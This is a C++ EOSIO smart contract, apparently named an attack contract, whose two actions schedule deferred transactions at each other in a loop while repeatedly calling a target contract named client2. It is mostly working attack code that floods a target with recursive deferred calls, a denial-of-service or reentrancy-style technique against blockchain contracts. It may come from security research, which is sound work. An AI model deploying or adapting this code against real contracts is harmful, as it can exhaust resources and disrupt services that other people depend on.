//#include <eosiolib/permission.hpp>
#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/action.hpp>
//#include <eosiolib/transaction.h>
#include <eosiolib/contract.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/action.h>
#include <eosio/serialize.hpp>
#include <eosiolib/transaction.h>
#include <eosiolib/transaction.hpp> 
#include <eosiolib/symbol.hpp>
#include <eosiolib/asset.hpp> 

using namespace eosio;

class [[eosio::contract]] TeserAttack : public eosio::contract {
    public:
      using contract::contract;
        [[eosio::action]]
        void main(name client, uint64_t idx, asset t)
        {
            uint128_t initnum = 1;
            transaction out1{};
            transaction target{};


            int N = 1; // N division

            /////////////// TARGET CONTRACT METHOD ARGUMENT //////////
            //////////////////////////////////////////////////////////////
            name targetContract = "client2"_n;
            name targetMethod = name("main");
            auto argu = std::make_tuple(
                    client,
                    uint64_t(idx), 
                    t
                    );

            //out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(name("client2"),idx,t));
            target.actions.emplace_back(permission_level{_self , "active"_n}, targetContract,  targetMethod, argu);
            target.send(idx, client, false);

            /////////////// Multi Dimension Call ///////////////////////
            for (int i =0; i < N ; i ++)
            {
                out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple( client, uint64_t(N * idx + (1-i)),t ) );
                out1.send(N * idx + (1-i), client, false);
                out1.actions.pop_back();
                print ("[+] Seq Number :%d \n", N * idx + (1-i) );
            }
        };
        [[eosio::action]]
        void func(name client, uint64_t idx, asset t)
        {
            auto argu = std::make_tuple(client, uint64_t(idx), t);
            transaction out{};
            out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, argu );
            out.send((idx), client, false);
            print("\t[#] FUNC: ", idx);
        };
};

EOSIO_DISPATCH( TeserAttack, (main)(func) )

